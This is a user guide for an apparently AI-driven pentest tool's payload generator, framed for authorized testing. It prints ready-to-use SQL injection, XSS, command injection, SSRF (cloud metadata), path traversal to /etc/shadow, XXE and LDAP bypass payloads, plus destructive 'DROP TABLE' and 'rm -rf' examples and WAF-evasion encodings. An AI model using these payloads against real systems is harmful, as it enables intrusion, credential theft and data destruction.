# Payload Generation Guide

Complete guide to using SecGPT's context-aware payload generation system for security testing.

## Overview

The payload generator creates testing payloads based on:
- Vulnerability type detected
- Technology stack inferred
- Finding context (ports, services, parameters)
- Safety requirements

**Safety First:** All payloads operate in safe mode by default (read-only, non-destructive).

## Table of Contents

1. [Quick Start](#quick-start)
2. [Payload Categories](#payload-categories)
3. [Template Library](#template-library)
4. [Context-Aware Generation](#context-aware-generation)
5. [Encoding Options](#encoding-options)
6. [Integration](#integration)

---

## Quick Start

### Browse Available Templates

```bash
# List all categories
agent payload categories

# Output:
# Available payload categories (15 templates):
#   - sqli (3 templates)
#   - xss (3 templates)
#   - command_injection (2 templates)
#   - ssrf (2 templates)
#   - path_traversal (2 templates)
#   - xxe (1 template)
#   - ldap_injection (1 template)

# List templates in a category
agent payload list --category sqli

# Search by tag
agent payload list --tag blind
```

### Generate from Finding

```bash
# Generate payloads automatically for a finding
agent payload generate --finding-id 42

# Output:
# Generated 3 payloads for finding #42 (SQL Injection in login)
# 
# 1. sqli_union_based
#    Severity: HIGH
#    Payload: ' UNION SELECT NULL,NULL,NULL--
# 
# 2. sqli_error_based
#    Severity: MEDIUM
#    Payload: ' AND 1=CAST(@@version as int)--
# ...
```

### Use Template Directly

```bash
# Generate from specific template
agent payload from-template sqli_time_based \
  --var target_table=users \
  --var delay_seconds=5

# Output:
# Payload: ' AND (SELECT SLEEP(5))--
```

---

## Payload Categories

### 1. SQL Injection (sqli)

**Templates:**
- `sqli_union_based` - UNION-based extraction
- `sqli_error_based` - Error message exploitation
- `sqli_time_based` - Blind time-based detection

**Variables:**
- `target_table` - Table to query
- `target_column` - Column to extract  
- `delay_seconds` - Sleep duration (time-based)

**Example:**
```bash
agent payload from-template sqli_union_based \
  --var target_table=users \
  --var target_column=password
```

**Generated:**
```sql
' UNION SELECT NULL,password FROM users--
```

---

### 2. Cross-Site Scripting (xss)

**Templates:**
- `xss_reflected` - Reflected XSS testing
- `xss_stored` - Stored XSS detection
- `xss_dom` - DOM-based XSS

**Variables:**
- `alert_text` - Custom alert message
- `callback_url` - External callback for blind XSS

**Example:**
```bash
agent payload from-template xss_reflected \
  --var alert_text="XSS_FOUND"
```

**Generated:**
```html
<script>alert('XSS_FOUND')</script>
```

---

### 3. Command Injection (command_injection)

**Templates:**
- `cmd_injection_unix` - Unix/Linux command injection
- `cmd_injection_windows` - Windows command injection

**Variables:**
- `command` - Command to execute (default: `whoami`)
- `separator` - Command separator (`;`, `&&`, `|`)

**Example:**
```bash
agent payload from-template cmd_injection_unix \
  --var command="id" \
  --var separator="&&"
```

**Generated:**
```bash
&& id
```

---

### 4. Server-Side Request Forgery (ssrf)

**Templates:**
- `ssrf_internal` - Access internal services
- `ssrf_dns_callback` - DNS exfiltration

**Variables:**
- `target_host` - Internal target (default: `localhost`)
- `target_port` - Port to access
- `callback_domain` - DNS callback domain

**Example:**
```bash
agent payload from-template ssrf_internal \
  --var target_host=169.254.169.254 \
  --var target_port=80
```

**Generated:**
```
http://169.254.169.254:80/latest/meta-data/
```

---

### 5. Path Traversal (path_traversal)

**Templates:**
- `path_traversal_unix` - Unix path traversal
- `path_traversal_windows` - Windows path traversal

**Variables:**
- `target_file` - File to read (default: `/etc/passwd` or `c:\windows\win.ini`)
- `depth` - Directory traversal depth

**Example:**
```bash
agent payload from-template path_traversal_unix \
  --var target_file=/etc/shadow \
  --var depth=5
```

**Generated:**
```
../../../../../etc/shadow
```

---

### 6. XML External Entity (xxe)

**Template:**
- `xxe_file_read` - Read local files via XXE

**Variables:**
- `target_file` - File to read (default: `/etc/passwd`)
- `entity_name` - XML entity name

**Example:**
```bash
agent payload from-template xxe_file_read \
  --var target_file=/etc/hostname
```

**Generated:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<foo>&xxe;</foo>
```

---

### 7. LDAP Injection (ldap_injection)

**Template:**
- `ldap_injection_auth_bypass` - Authentication bypass

**Variables:**
- `bypass_string` - Injection payload

**Example:**
```bash
agent payload from-template ldap_injection_auth_bypass
```

**Generated:**
```
*)(uid=*))(|(uid=*
```

---

## Context-Aware Generation

The payload generator analyzes findings to automatically select appropriate templates.

### How It Works

1. **Finding Categorization** - Classify vulnerability type from title/description
2. **Technology Inference** - Detect stack (MySQL, PostgreSQL, Windows, Unix, etc.)
3. **Parameter Extraction** - Extract hosts, ports, parameters from evidence
4. **Template Selection** - Choose best templates for context
5. **Variable Auto-Fill** - Populate template variables automatically

### Example

**Finding:**
```
Title: SQL Injection in login form
Description: MySQL database detected
Host: 192.168.1.100
Port: 3306
Evidence: Parameter 'username' is vulnerable
```

**Generated Payloads:**
```bash
agent payload generate --finding-id 42

# Auto-selects MySQL-specific SQLi payloads
# Auto-fills target_table from context
# Includes:
#   1. UNION-based (MySQL syntax)
#   2. Error-based (MySQL functions)
#   3. Time-based (SLEEP function)
```

### Manual Override

```bash
# Generate specific category
agent payload generate --finding-id 42 --category xss

# Limit payload count
agent payload generate --finding-id 42 --max 3

# Unsafe mode (advanced users only)
agent payload generate --finding-id 42 --unsafe
```

---

## Encoding Options

Bypass WAFs and filters with encoding:

### Available Encodings

```python
from pentest_agent.payloads.generator import PayloadGenerator

generator = PayloadGenerator(db_path, safe_mode=True)

# 1. URL encoding
encoded = generator.encode_payload("' OR 1=1--", "url")
# Output: %27%20OR%201%3D1--

# 2. Double URL encoding
encoded = generator.encode_payload("' OR 1=1--", "double_url")
# Output: %2527%2520OR%25201%253D1--

# 3. HTML entity encoding
encoded = generator.encode_payload("<script>alert(1)</script>", "html")
# Output: &lt;script&gt;alert(1)&lt;/script&gt;

# 4. Base64 encoding
encoded = generator.encode_payload("admin:password", "base64")
# Output: YWRtaW46cGFzc3dvcmQ=

# 5. Hex encoding
encoded = generator.encode_payload("admin", "hex")
# Output: 61646d696e
```

### CLI Usage

```bash
# Generate with encoding (future feature - add to from-template command)
agent payload from-template xss_reflected \
  --var alert_text=test \
  --encode url
```

---

## Integration

### With TUI

1. Launch TUI: `agent-tui`
2. Browse findings
3. Press `Enter` on a finding
4. Press `p` to generate payloads
5. View generated payloads in detail screen

### With Analysis

```bash
# Generate payloads for all findings
agent payload generate --all

# Ask analysis about payloads
agent analysis run --query "Which findings have injectable parameters?"

# Prioritize payload testing
agent analysis run --query "Order findings by exploitability"
```

### Programmatic Usage

```python
from pathlib import Path
from pentest_agent.payloads.generator import PayloadGenerator
from pentest_agent.payloads.templates import TemplateLibrary

# Initialize
db_path = Path("sessions/192.168.1.100/session.db")
generator = PayloadGenerator(db_path, safe_mode=True)

# Generate for finding
payloads = generator.generate_for_finding(finding_id=42, max_payloads=5)

for payload in payloads:
    print(f"Template: {payload['template_name']}")
    print(f"Category: {payload['category']}")
    print(f"Severity: {payload['severity']}")
    print(f"Payload: {payload['payload']}")
    print("---")

# Use specific template
template_lib = TemplateLibrary()
template = template_lib.get_by_name("sqli_union_based")

variables = {"target_table": "users", "target_column": "password"}
payload_data = generator.generate_from_template(template, variables)

print(payload_data["payload"])
```

---

## Safety Modes

### Safe Mode (Default)

**Characteristics:**
- Read-only operations
- No data modification
- No destructive commands
- Low severity payloads

**Examples:**
- `' UNION SELECT NULL,NULL--` (SQLi detection)
- `<script>alert('XSS')</script>` (XSS PoC)
- `../../../../etc/passwd` (Path traversal read)

### Unsafe Mode (Advanced)

**Enable with caution:**
```bash
agent payload generate --finding-id 42 --unsafe
```

**Characteristics:**
- Write operations allowed
- Data modification payloads
- Higher severity

**Examples:**
- `'; DROP TABLE users--` (SQLi destruction)
- `<img src=x onerror=eval(atob('...'))>` (XSS exploitation)
- `; rm -rf /tmp/test` (Command execution)

⚠️ **Warning:** Only use unsafe mode in authorized test environments with explicit permission.

---

## Advanced Usage

### Custom Templates

```python
from pentest_agent.payloads.templates import PayloadTemplate, TemplateLibrary

# Create custom template
custom_template = PayloadTemplate(
    name="custom_sqli",
    category="sqli",
    description="Custom SQL injection for Oracle",
    payload_template="' UNION SELECT {target_column} FROM {target_table} WHERE ROWNUM=1--",
    severity="HIGH",
    variables=["target_column", "target_table"],
    tags=["oracle", "union"],
    safe_mode=True
)

# Use custom template
lib = TemplateLibrary()
# Future: lib.add_custom_template(custom_template)
```

### Batch Generation

```bash
# Generate for all high-severity findings
for finding_id in $(agent show findings --severity HIGH --format json | jq '.[].id'); do
  agent payload generate --finding-id $finding_id
done
```

### Export Payloads

```python
from pentest_agent.payloads.templates import TemplateLibrary

lib = TemplateLibrary()

# Export all templates to JSON
templates_json = lib.export_json()
print(templates_json)

# Save to file
with open("payload_library.json", "w") as f:
    f.write(templates_json)
```

---

## Best Practices

### 1. Start with Safe Mode

Always test with safe mode first:
```bash
agent payload generate --finding-id 42  # Safe mode default
```

Only escalate to unsafe if:
- You have explicit authorization
- Safe mode payloads don't trigger vulnerability
- You understand the impact

### 2. Verify Context

Review auto-filled variables:
```bash
# Check what was generated
agent payload generate --finding-id 42 --verbose

# Override if needed
agent payload from-template sqli_union_based \
  --var target_table=custom_table
```

### 3. Use Appropriate Templates

Match template to target:
- **MySQL**: Use `sqli_union_based`, `sqli_error_based`
- **PostgreSQL**: Use `sqli_error_based`
- **MSSQL**: Use `sqli_time_based`
- **Oracle**: Use `sqli_error_based`

### 4. Test Encoding

If payloads are blocked:
```python
# Try different encodings
for encoding in ["url", "double_url", "html"]:
    encoded = generator.encode_payload(payload, encoding)
    # Test encoded payload
```

---

## Troubleshooting

### No Payloads Generated

**Symptom:**
```
Generated 0 payloads for finding #42
```

**Solutions:**
1. Check finding category is recognized
2. Manually specify category: `--category sqli`
3. Use template directly: `agent payload from-template`

### Missing Variables

**Symptom:**
```
Template requires variables: target_table, target_column
```

**Solution:**
```bash
agent payload from-template sqli_union_based \
  --var target_table=users \
  --var target_column=password
```

### Unsafe Payload Blocked

**Symptom:**
```
Payload blocked in safe mode
```

**Solution:**
```bash
# Only if authorized!
agent payload generate --finding-id 42 --unsafe
```

---

## Example Workflows

### Workflow 1: Web App Testing

```bash
# 1. Ingest scan results
agent ingest burp burp_results.xml

# 2. Generate payloads for all findings
agent payload generate --all

# 3. Review in TUI
agent-tui
# Press 'p' on findings to see payloads

# 4. Test manually
# Copy payloads from TUI
# Paste into Burp Repeater
```

### Workflow 2: API Testing

```bash
# 1. Crawl API
agent crawl --target https://api.example.com

# 2. Generate API-specific payloads
agent payload generate --category sqli --all
agent payload generate --category command_injection --all

# 3. Export for automation
agent show payloads --format json > payloads.json

# 4. Use with fuzzer
ffuf -w payloads.json:PAYLOAD -u https://api.example.com/search?q=PAYLOAD
```

---

## API Reference

```python
# Generator methods
generator.generate_for_finding(finding_id: int, max_payloads: int = 5) -> list
generator.generate_from_template(template: PayloadTemplate, variables: dict) -> dict
generator.encode_payload(payload: str, encoding: str) -> str

# Template library methods
lib.list_categories() -> list
lib.get_by_category(category: str) -> list
lib.get_by_name(name: str) -> PayloadTemplate
lib.search_by_tag(tag: str) -> list
lib.export_json() -> str
```

---

## Security Considerations

### Authorization

- Only generate payloads for authorized targets
- Document payload testing in engagement notes
- Follow rules of engagement

### Safe Testing

```bash
# Test in isolated environment first
agent payload generate --finding-id 42 --safe-mode

# Verify target is test environment
whois target-domain.com

# Use non-destructive payloads
# Avoid: DROP, DELETE, UPDATE, rm, format
# Prefer: SELECT, GET, read operations
```

### Logging

All payload generation is logged:
```bash
# View audit log
tail -f sessions/*/audit.jsonl | jq 'select(.action == "payload_generate")'
```

---

## See Also

- [Authenticated Crawling Guide](AUTHENTICATED_CRAWLING_GUIDE.md)
- [TUI Guide](TUI_GUIDE.md)
- [Analysis Documentation](../README.md#analysis)

---

*Last updated: April 27, 2026*
